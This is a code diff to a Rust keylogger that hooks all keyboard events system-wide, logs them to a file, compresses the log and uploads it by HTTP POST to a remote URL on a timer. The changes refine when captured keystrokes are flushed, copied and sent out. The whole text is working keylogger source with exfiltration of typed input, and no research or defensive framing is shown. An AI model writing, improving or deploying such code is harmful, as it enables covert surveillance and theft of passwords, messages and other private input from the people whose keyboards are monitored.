@@ -4,6 +4,7 @@ use rdev::{listen, Event, EventType};
 use serde::Serialize;
 use reqwest::Client;
 use tokio::{select, sync::watch};
+use std::sync::{Arc, Mutex};
 
 #[derive(Serialize)]
 struct KeyEvent {
@@ -37,7 +38,8 @@ where
 }
 
 fn create_callback(
-    mut writer: BufWriter<File>
+    mut writer: BufWriter<File>,
+    flush_signal: Arc<Mutex<bool>>
 ) -> Box<dyn FnMut(Event) + Send> {
     let mut current_minute = unix_minute_now();
 
@@ -54,6 +56,9 @@ fn create_callback(
             if m != current_minute {
                 if let Err(e) = writer.flush() {
                     println!("Failed to flush file: {}", e);
+                }
+                if let Ok(mut signal) = flush_signal.lock() {
+                    *signal = true;
                 }
                 current_minute = m;
             }
@@ -78,10 +83,7 @@ async fn upload_keylog(
     url: &str,
     path: &str,
 ) -> anyhow::Result<()> {
-    let temp_path = format!("{}.upload", path);
-    std::fs::copy(path, &temp_path)?;
-    
-    let compressed = gzip_file_to_vec(&temp_path)?;
+    let compressed = gzip_file_to_vec(path)?;
     
     let form = reqwest::multipart::Form::new()
         .part("file", reqwest::multipart::Part::bytes(compressed)
@@ -93,8 +95,6 @@ async fn upload_keylog(
         .multipart(form)
         .send()
         .await?;
-
-    let _ = std::fs::remove_file(&temp_path);
 
     if !response.status().is_success() {
         return Err(anyhow::anyhow!(
@@ -128,7 +128,9 @@ async fn main() -> anyhow::Result<()> {
         .append(true)
         .open(&current_file)?;
     let writer = BufWriter::new(file);
-    let callback = create_callback(writer);
+    
+    let flush_signal = Arc::new(Mutex::new(false));
+    let callback = create_callback(writer, flush_signal.clone());
     let (stop_tx, mut stop_rx) = watch::channel(false);
 
     let send_thread = tokio::spawn(async move {
@@ -139,15 +141,18 @@ async fn main() -> anyhow::Result<()> {
         loop {
             select! {
                 _ = tick.tick() => {
-                    if std::path::Path::new(&current_file).metadata().map(|m| m.len()).unwrap_or(0) > 0 {
-                        if let Err(e) = std::fs::rename(&current_file, &path) {
-                            println!("Failed to rotate file: {}", e);
+                    let should_upload = if let Ok(mut signal) = flush_signal.lock() {
+                        let should = *signal && std::path::Path::new(&current_file).metadata().map(|m| m.len()).unwrap_or(0) > 0;
+                        *signal = false;
+                        should
+                    } else {
+                        false
+                    };
+                    
+                    if should_upload {
+                        if let Err(e) = std::fs::copy(&current_file, &path) {
+                            println!("Failed to copy current file: {}", e);
                         } else {
-                            let _ = File::options()
-                                .create(true)
-                                .write(true)
-                                .open(&current_file);
-                            
                             if let Err(error) = upload_keylog(&url, &path).await {
                                 println!("Error: {:?}", error);
                             }
